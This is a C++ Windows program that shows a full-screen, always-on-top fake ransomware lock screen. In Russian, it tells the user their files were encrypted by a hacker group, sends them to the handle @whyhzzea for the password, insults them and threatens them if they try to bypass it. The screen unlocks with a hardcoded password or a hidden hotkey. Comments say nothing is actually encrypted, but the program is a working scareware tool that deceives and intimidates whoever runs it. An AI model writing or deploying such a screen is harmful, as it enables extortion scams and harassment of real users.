#define UNICODE
#define _UNICODE
#include <windows.h>
#include <commctrl.h>
#include <string>

static HWND gEdit = nullptr;
static HFONT gFont = nullptr;
static HFONT gBigFont = nullptr;
static const COLORREF BG = RGB(0, 0, 0);
static const COLORREF NEON = RGB(220, 0, 255);
static const wchar_t* PASSWORD = L"228";
static const int EXIT_HOTKEY = 1;

static HFONT MakeFont(int height, int weight = FW_NORMAL) {
    return CreateFontW(-height, 0, 0, 0, weight, FALSE, FALSE, FALSE,
        DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
        CLEARTYPE_QUALITY, FIXED_PITCH | FF_MODERN, L"Consolas");
}

static void CenterText(HDC dc, const wchar_t* text, RECT r, HFONT font, int color = NEON) {
    SetBkMode(dc, TRANSPARENT);
    SetTextColor(dc, color);
    HFONT old = (HFONT)SelectObject(dc, font);
    DrawTextW(dc, text, -1, &r, DT_CENTER | DT_VCENTER | DT_SINGLELINE | DT_NOPREFIX);
    SelectObject(dc, old);
}

static void Layout(HWND hwnd) {
    if (!gEdit) return;
    RECT rc{}; GetClientRect(hwnd, &rc);
    int w = rc.right - rc.left;
    int h = rc.bottom - rc.top;
    int editW = (w * 48) / 100;
    if (editW > 650) editW = 650;
    if (editW < 260) editW = w - 50;
    int editH = (h < 700) ? 38 : 48;
    SetWindowPos(gEdit, nullptr, (w - editW) / 2, h * 78 / 100,
        editW, editH, SWP_NOZORDER | SWP_NOACTIVATE);
}

static void Unlock(HWND hwnd) {
    wchar_t value[128]{};
    GetWindowTextW(gEdit, value, 128);
    if (std::wstring(value) == PASSWORD) {
        DestroyWindow(hwnd);
    } else {
        SetWindowTextW(gEdit, L"");
        MessageBeep(MB_ICONWARNING);
        MessageBoxW(hwnd, L"Неверный пароль.", L"CYUTSUD", MB_OK | MB_ICONWARNING | MB_TOPMOST);
        SetFocus(gEdit);
    }
}

LRESULT CALLBACK EditProc(HWND edit, UINT msg, WPARAM wp, LPARAM lp, UINT_PTR, DWORD_PTR) {
    if (msg == WM_KEYDOWN && wp == VK_RETURN) {
        HWND parent = GetParent(edit);
        PostMessageW(parent, WM_APP + 1, 0, 0);
        return 0;
    }
    return DefSubclassProc(edit, msg, wp, lp);
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
    switch (msg) {
    case WM_CREATE: {
        gFont = MakeFont(22, FW_NORMAL);
        gBigFont = MakeFont(44, FW_BOLD);
        gEdit = CreateWindowExW(WS_EX_CLIENTEDGE, L"EDIT", L"",
            WS_CHILD | WS_VISIBLE | ES_PASSWORD | ES_AUTOHSCROLL | ES_CENTER,
            0, 0, 300, 42, hwnd, (HMENU)1001, GetModuleHandleW(nullptr), nullptr);
        SendMessageW(gEdit, WM_SETFONT, (WPARAM)gFont, TRUE);
        SetWindowSubclass(gEdit, EditProc, 1, 0);
        Layout(hwnd);
        SetFocus(gEdit);
        // Emergency exit: Ctrl+Shift+Q. Windows security shortcuts remain untouched.
        RegisterHotKey(hwnd, EXIT_HOTKEY, MOD_CONTROL | MOD_SHIFT, 'Q');
        return 0;
    }
    case WM_SIZE:
        Layout(hwnd);
        InvalidateRect(hwnd, nullptr, TRUE);
        return 0;
    case WM_APP + 1:
        Unlock(hwnd);
        return 0;
    case WM_HOTKEY:
        if (wp == EXIT_HOTKEY) DestroyWindow(hwnd);
        return 0;
    case WM_CTLCOLOREDIT: {
        HDC dc = (HDC)wp;
        SetTextColor(dc, NEON);
        SetBkColor(dc, RGB(8, 0, 12));
        static HBRUSH brush = CreateSolidBrush(RGB(8, 0, 12));
        return (LRESULT)brush;
    }
    case WM_PAINT: {
        PAINTSTRUCT ps{};
        HDC dc = BeginPaint(hwnd, &ps);
        RECT rc{}; GetClientRect(hwnd, &rc);
        int w = rc.right, h = rc.bottom;
        HBRUSH bg = CreateSolidBrush(BG);
        FillRect(dc, &rc, bg);
        DeleteObject(bg);

        // Large clean frame, matching the supplied reference. No glitch effects.
        int margin = (w < 900) ? 10 : 16;
        int border = (w < 900) ? 3 : 5;
        HPEN pen = CreatePen(PS_SOLID, border, NEON);
        HPEN oldPen = (HPEN)SelectObject(dc, pen);
        HBRUSH oldBrush = (HBRUSH)SelectObject(dc, GetStockObject(HOLLOW_BRUSH));
        RoundRect(dc, margin, margin, w - margin, h - margin, 22, 22);
        SelectObject(dc, oldBrush);
        SelectObject(dc, oldPen);
        DeleteObject(pen);

        int top = h * 24 / 100;
        int lineH = (h < 700) ? 40 : 58;
        HFONT body = MakeFont((h < 700) ? 20 : 30, FW_NORMAL);
        CenterText(dc, L"Упс похоже ваши файлы были зашифрованы",
            RECT{margin + 20, top, w - margin - 20, top + lineH}, body);
        CenterText(dc, L"ключем хакерской группой Cyuts",
            RECT{margin + 20, top + lineH, w - margin - 20, top + lineH * 2}, body);
        CenterText(dc, L"для получение Parola на пиши @whyhzzea",
            RECT{margin + 20, top + lineH * 2, w - margin - 20, top + lineH * 3}, body);

        int dividerY = h * 53 / 100;
        HPEN linePen = CreatePen(PS_SOLID, border, NEON);
        oldPen = (HPEN)SelectObject(dc, linePen);
        MoveToEx(dc, margin + 30, dividerY, nullptr);
        LineTo(dc, w - margin - 30, dividerY);
        SelectObject(dc, oldPen);
        DeleteObject(linePen);

        CenterText(dc, L"Понял уебище?",
            RECT{margin + 20, dividerY + 18, w - margin - 20, dividerY + (h < 700 ? 82 : 112)}, gBigFont);
        CenterText(dc, L"Любая попытка обойти систему обойдется тебе плохо",
            RECT{margin + 20, dividerY + (h < 700 ? 88 : 120), w - margin - 20, dividerY + (h < 700 ? 138 : 178)}, body);
        DeleteObject(body);
        EndPaint(hwnd, &ps);
        return 0;
    }
    case WM_DESTROY:
        UnregisterHotKey(hwnd, EXIT_HOTKEY);
        if (gFont) { DeleteObject(gFont); gFont = nullptr; }
        if (gBigFont) { DeleteObject(gBigFont); gBigFont = nullptr; }
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProcW(hwnd, msg, wp, lp);
}

int WINAPI wWinMain(HINSTANCE instance, HINSTANCE, PWSTR, int) {
    const wchar_t CLASS_NAME[] = L"CyutsuddSafeFullscreenDemo";
    WNDCLASSW wc{};
    wc.lpfnWndProc = WndProc;
    wc.hInstance = instance;
    wc.lpszClassName = CLASS_NAME;
    wc.hCursor = LoadCursor(nullptr, IDC_ARROW);
    wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
    if (!RegisterClassW(&wc)) return 1;

    // Borderless, full-screen and topmost. Does not disable Windows security keys,
    // alter files, encrypt data, persist, or prevent Task Manager from opening.
    HWND hwnd = CreateWindowExW(WS_EX_TOPMOST, CLASS_NAME, L"CYUTSUD — visual demo",
        WS_POPUP, 0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN),
        nullptr, nullptr, instance, nullptr);
    if (!hwnd) return 2;
    ShowWindow(hwnd, SW_SHOW);
    UpdateWindow(hwnd);
    SetForegroundWindow(hwnd);
    SetFocus(gEdit);

    MSG msg{};
    while (GetMessageW(&msg, nullptr, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }
    return (int)msg.wParam;
}
